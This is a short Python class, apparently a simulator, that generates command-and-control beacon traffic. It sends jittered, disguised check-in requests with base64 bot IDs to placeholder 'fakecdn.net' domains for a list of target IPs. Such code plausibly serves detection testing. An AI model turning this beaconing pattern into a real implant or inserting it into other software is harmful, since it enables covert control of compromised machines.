import requests
import base64
import uuid
import random
import time
from datetime import datetime

class C2Beacon:
    def __init__(self, count=15, interval=(45,180)):
        self.count = count
        self.interval = interval
        self.domains = [
            "http://update-check-01.fakecdn.net",
            "http://cdn-metrics-secure.fakecdn.net"
        ]

    def run(self, targets: list) -> dict:
        r = {'start_time': datetime.now().isoformat(), 'targets': {}}
        for ip in targets:
            beacons = []
            for i in range(self.count):
                d = random.choice(self.domains)
                bid = base64.b64encode(f"{ip}-{uuid.uuid4().hex[:8]}".encode()).decode()
                try:
                    resp = requests.get(
                        f"{d}/checkin?id={bid}",
                        headers={'User-Agent':'Mozilla/5.0','X-Bot-ID':bid},
                        timeout=5
                    )
                    beacons.append({'status':resp.status_code,'id':bid[:15]})
                except Exception as e:
                    beacons.append({'error':str(e)[:50],'expected':True})
                time.sleep(random.uniform(*self.interval))
            r['targets'][ip] = {
                'total':len(beacons),
                'avg_interval':sum(self.interval)/2,
                'sample':beacons[:3]
            }
        r['end_time'] = datetime.now().isoformat()
        return r
